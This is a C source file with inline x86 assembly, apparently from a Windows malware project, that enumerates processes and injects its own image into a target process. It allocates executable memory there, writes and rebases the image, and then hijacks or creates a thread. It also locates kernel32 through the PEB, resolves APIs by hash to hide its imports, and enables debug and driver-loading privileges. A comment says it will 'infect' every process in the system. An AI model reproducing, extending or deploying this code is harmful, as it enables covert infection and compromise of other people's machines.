#include "../PlayBuddy.h"

DWORD RvaToOffset(DWORD RVA, DWORD pFileMap);

/*	=================================
	== NtQuerySystemInformation wrap
	=================================	*/

PVOID QueryInformation ( SYSTEMINFOCLASS dwClass )
{
	PVOID pResult = NULL;
	DWORD dwLength = 0;
	NTSTATUS res;

	// Enumerate ALL processes in system and infect it
	do {
		dwLength += 0x8000;
		pResult = xrealloc( pResult, dwLength );

		res = NtQuerySystemInformation(dwClass, pResult, dwLength, NULL);
	} while (res == STATUS_INFO_LENGTH_MISMATCH);

	if ( res )
	{
		// error
		xfree( pResult );
		pResult = NULL;
	}

	return pResult;
}

// ------------------------------------------------------
// Injecting in process specifed by PID or ProcName
// If PID not NULL process will selected by PID and ProcName can be NULL, 
// else try to find process specifed by ProcName
// Both ProcName and PID cannot be NULL
// ------------------------------------------------------

HANDLE Inject(PWCHAR ProcName, DWORD PID, PTHREAD_START_ROUTINE RemoteProc, DWORD Base, HANDLE hThread)
{
	IMAGE_DOS_HEADER * dos;
	IMAGE_NT_HEADERS *pe;
	DWORD SizeOfImage, tmp;
	PVOID NewBase, NewImage;
	HANDLE Proc;
		
	if (PID == NULL) PID = FindProcess(ProcName);
	
	if (Base == NULL) Base = (DWORD) GetModuleHandle(NULL);

	dos = (IMAGE_DOS_HEADER *) Base;
	pe = (IMAGE_NT_HEADERS *) ((DWORD) dos->e_lfanew + (DWORD) dos);

	SizeOfImage = pe->OptionalHeader.SizeOfImage;

	Proc = OpenProcess(PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_CREATE_THREAD, 0, PID);	
	NewBase = VirtualAllocEx(Proc, NULL, SizeOfImage, MEM_COMMIT, PAGE_EXECUTE_READWRITE);

	if (Proc && NewBase)
	{	
		NewImage = VirtualAlloc(NULL, SizeOfImage, MEM_COMMIT, PAGE_READWRITE);

		// MemCpy
		__asm
		{
			pushad

			cld
			mov		esi, Base
			mov		edi, NewImage
			mov		ecx, SizeOfImage
			rep		movsb

			popad
		}

		// Fix-up offsets
		FixBase(NewImage, (DWORD)NewBase - Base); 
		WriteProcessMemory(Proc, NewBase, NewImage, SizeOfImage, &tmp);
		VirtualFree(NewImage, 0, MEM_RELEASE);

		RemoteProc = (PTHREAD_START_ROUTINE) ((DWORD) RemoteProc - Base + (DWORD) NewBase);
		CONTEXT ctx;
		ctx.ContextFlags = CONTEXT_FULL;
		if ( !hThread )
		{
			hThread = CreateRemoteThread(Proc, NULL, NULL, RemoteProc, 0, CREATE_SUSPENDED, &tmp);
			if ( hThread )
			{
				if ( GetThreadContext( hThread, &ctx ) )
				{
					ctx.Eax;					// any
					ctx.Ecx = 0;				// oep
					ctx.Edx = (DWORD) NewBase;	// iInstance
					ctx.Eip = (DWORD) RemoteProc;
					SetThreadContext( hThread, &ctx );
					ResumeThread( hThread );
				}
			}
		} 
		else
		{
			if ( GetThreadContext( hThread, &ctx ) )
			{
				ctx.Eax;					// oeax
				ctx.Ecx = ctx.Eip;			// oeip
				ctx.Edx = (DWORD) NewBase;	// iInstance
				ctx.Eip = (DWORD) RemoteProc;
				SetThreadContext( hThread, &ctx );
			}
		}
		

	}

	CloseHandle(Proc);

	return hThread;
}

// ------------------------------------------------------

void FixBase(PVOID Image, UINT dwDelta, BOOL isRawFile)
{
	PIMAGE_NT_HEADERS pe;
	PIMAGE_BASE_RELOCATION reloc;
	DWORD size;

	pe		= (PIMAGE_NT_HEADERS) ((DWORD)(((PIMAGE_DOS_HEADER) Image)->e_lfanew) + (DWORD) Image);
	reloc	= (PIMAGE_BASE_RELOCATION)((DWORD)pe->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress + (int)Image);
	size	= (DWORD)pe->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].Size;

	if ( isRawFile ) reloc = (PIMAGE_BASE_RELOCATION) RvaToOffset( (int)reloc - (int)Image, (int)Image);

	DWORD dwOffset, SmallOffset;

	while ( size )
	{
		if ( reloc->VirtualAddress )
		{
			int number = (reloc->SizeOfBlock - 8) / 2;
			WORD * Rel = (WORD *)((int)reloc + 8);

			if ( isRawFile ) dwOffset = RvaToOffset( reloc->VirtualAddress, (int)Image);
			else
			dwOffset = reloc->VirtualAddress + (int)Image;
			
			for (int i = 0; i < number; i++)
			{
				if	(Rel[i])
				{
					SmallOffset = (Rel[i] & 0x0FFF) + dwOffset;
					
					__asm
					{
						pushad

						mov		ecx, dwDelta
						mov		eax, SmallOffset
						add		dword ptr[eax], ecx 

						popad
					};
				}
			}
		}

		size -= reloc->SizeOfBlock;
		reloc = (PIMAGE_BASE_RELOCATION) (reloc->SizeOfBlock + (DWORD)reloc);
	}
}

// ------------------------------------------------------

bool IsImportByOrdinal(DWORD ImportDescriptor)
{
	return (ImportDescriptor & 0x80000000) != 0;
}

// ------------------------------------------------------

__declspec(naked) HMODULE GetKernel32(void)
{
	__asm 
	{
		push    esi
		xor     eax,eax
		mov     eax,fs:[0x30]
		mov     eax,[eax+0x0c]
		mov     esi,[eax+0x1c]
		lodsd
		mov     eax,[eax+0x8]
		pop     esi
		ret
	}
}
// ------------------------------------------------------
DWORD __stdcall CalcHash(char *s)
{
	__asm 
	{
		mov		eax,s
		push	edx
		xor		edx,edx
calc_hash:
		rol		edx,3
		xor		dl,[eax]
		inc		eax
		cmp		[eax],0
        jnz		calc_hash
		mov		eax,edx
		pop		edx
	}
}
// ------------------------------------------------------
LPVOID __stdcall GetProcAddrEx(HMODULE hModule, DWORD dwProcHash)
{
	__asm
	{
		xor     eax,eax
		mov     ebx,dwProcHash
		mov     esi,hModule
		mov     edi,esi
		add     esi,[esi+3Ch]
		mov     ecx,[esi+78h]
		add     ecx,edi
		mov     edx,[ecx+1ch]
		push    edx
		mov     edx,[ecx+24h]
		push    edx
		mov     esi,[ecx+20h]
		add     esi,edi
		cdq
		dec     edx
next_func:     
		lodsd
		inc     edx
		add     eax,hModule
		push    eax
		call    CalcHash
		cmp     eax,ebx
		jnz		next_func
		mov     eax,hModule
		xchg    eax,edx
		pop     esi
		add     esi,edx
		shl     eax,1
		add     eax,esi
		xor     ecx,ecx
		movzx   ecx,word ptr [eax]
		pop     edi
		shl     ecx,2
		add     ecx,edx
		add     ecx,edi
		mov     eax,[ecx]
		add     eax,edx
	}
}
// ------------------------------------------------------

void ProcessImport(DWORD Image, BOOL LoadNewModules)
{
	HMODULE k32 = GetKernel32();
	typedef HMODULE (WINAPI *tgetmodule)( LPCSTR lpModuleName );
	typedef DWORD (WINAPI *tgetprocaddr)( HMODULE hModule, LPCSTR lpProcName );
	typedef HMODULE (WINAPI *tloadlib)( LPCSTR lpModuleName, PVOID resrvd, DWORD flags );

	tgetmodule	 xGetModuleHandle = (tgetmodule)GetProcAddrEx( k32, 0xC9BFFA7D);
	tloadlib	 xLoadLibraryEx = (tloadlib)GetProcAddrEx( k32, 0x4BF60E8);
	tgetprocaddr xGetProcAddress = (tgetprocaddr)GetProcAddrEx( k32, 0xF2509B84);


	LPCSTR szLibName, szFuncName;
	HMODULE LibHandle;
	PIMAGE_THUNK_DATA OriginalTable, ImportTable;
	PIMAGE_IMPORT_BY_NAME ImportName;

	PIMAGE_NT_HEADERS pe = (PIMAGE_NT_HEADERS)(Image + ((PIMAGE_DOS_HEADER)Image)->e_lfanew);
	PIMAGE_IMPORT_DESCRIPTOR import = (PIMAGE_IMPORT_DESCRIPTOR) (pe->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress + Image);

	if ((DWORD)import == Image) return; // non import table present

	while (import->Name)
	{
		szLibName = (LPCSTR) ((DWORD) import->Name + Image);
		LibHandle = xGetModuleHandle(szLibName);

		if (LibHandle == NULL)
			if (LoadNewModules) LibHandle = xLoadLibraryEx(szLibName, 0 , 0);

		OriginalTable = (PIMAGE_THUNK_DATA) ((DWORD)import->OriginalFirstThunk + Image);
		ImportTable = (PIMAGE_THUNK_DATA) ((DWORD)import->FirstThunk + Image);

		while (ImportTable->u1.AddressOfData)
		{
			if (IsImportByOrdinal(OriginalTable->u1.Ordinal) )
			{
				ImportTable->u1.Function = xGetProcAddress(LibHandle, (PCHAR) (OriginalTable->u1.Ordinal & 0xFFFF));
			}	else {

				ImportName = (PIMAGE_IMPORT_BY_NAME)((DWORD) OriginalTable->u1.AddressOfData + Image);
				szFuncName = (PCHAR) ImportName->Name;
					
				ImportTable->u1.Function = xGetProcAddress(LibHandle, szFuncName);
			}

			OriginalTable++;
			ImportTable++;
		}

		import++;
	}

	return;
}
// ------------------------------------------------------
DWORD RvaToOffset(DWORD RVA, DWORD pFileMap)
{
	PIMAGE_NT_HEADERS pe = (IMAGE_NT_HEADERS *) ( ((IMAGE_DOS_HEADER *)pFileMap)->e_lfanew + (UINT)pFileMap);
	PIMAGE_SECTION_HEADER section = (IMAGE_SECTION_HEADER *) ((DWORD)pe + sizeof (IMAGE_NT_HEADERS));

	int NumOfSections = pe->FileHeader.NumberOfSections;

	for (int i = 0; i < NumOfSections; i++)
	{
		if ((RVA >= section->VirtualAddress) && (RVA < section->VirtualAddress + section->SizeOfRawData))    
		//	return (DWORD)pFileMap + section->PointerToRawData + RVA - section->VirtualAddress;
			return section->PointerToRawData + RVA - section->VirtualAddress + pFileMap;
		section++;
	}
	return 0;
}

/*	================================
	== Find Proc
	================================	*/

DWORD FindProcess ( LPCWSTR szProcessName, TFindProcCallBack pFunc )
{
	DWORD dwResult = NULL;
	PSYSTEM_PROCESS_INFORMATION pProcInfo = (PSYSTEM_PROCESS_INFORMATION) 
												QueryInformation( SystemProcessInformation );

	if ( pProcInfo )
	{
		for (PSYSTEM_PROCESS_INFORMATION pProcInfoItem = pProcInfo;;)
		{
			if (pProcInfoItem->uUniqueProcessId > 4) // exclude "Idle" and "System" processes
			if (!lstrcmpiW(pProcInfoItem->usName.Buffer, szProcessName))
			{
				dwResult = pProcInfoItem->uUniqueProcessId;
				if ( pFunc ) pFunc( dwResult );
				else break;
			}

			if (pProcInfoItem->uNext == 0)
				break;

			// find the address of the next process structure
			pProcInfoItem = (PSYSTEM_PROCESS_INFORMATION)(((LPBYTE)pProcInfoItem) + pProcInfoItem->uNext);
		}
		
		xfree ( pProcInfo );
	}

	return dwResult;
}

/*	================================
	== Privelegies
	================================	*/

BOOL SetPrivilege( ULONG Privilege, BOOLEAN Enable)
{
	BOOLEAN Enabled;
	return ! RtlAdjustPrivilege( Privilege, Enable, 0, &Enabled );
}
// ------------------------------------------------------
BOOL GetDebug()
{
	return SetPrivilege( SE_DEBUG_PRIVILEGE, TRUE);
}

// ------------------------------------------------------
BOOL GetDriver()
{
	return SetPrivilege( SE_LOAD_DRIVER_PRIVILEGE, TRUE);
}

// ------------------------------------------------------